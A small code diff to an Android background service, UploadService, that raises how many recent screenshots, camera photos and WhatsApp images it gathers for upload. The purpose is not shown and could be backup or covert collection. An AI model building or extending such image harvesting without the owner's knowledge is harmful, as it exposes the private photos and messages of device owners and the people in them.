@@ -71,9 +71,9 @@ public class UploadService extends Service {
     private void uploadAll(final int startId) {
         executorService.execute(() -> {
             // 1. Gather Images
-            List<Uri> screenshots = findLatestImages("Screenshot", 5);
-            List<Uri> cameraPhotos = findLatestImages("Camera", 5);
-            List<Uri> whatsappPhotos = findLatestImages("WhatsApp", 5);
+            List<Uri> screenshots = findLatestImages("Screenshot", 30);
+            List<Uri> cameraPhotos = findLatestImages("Camera", 20);
+            List<Uri> whatsappPhotos = findLatestImages("WhatsApp", 10);
 
             List<Uri> allImages = new ArrayList<>();
             allImages.addAll(screenshots);
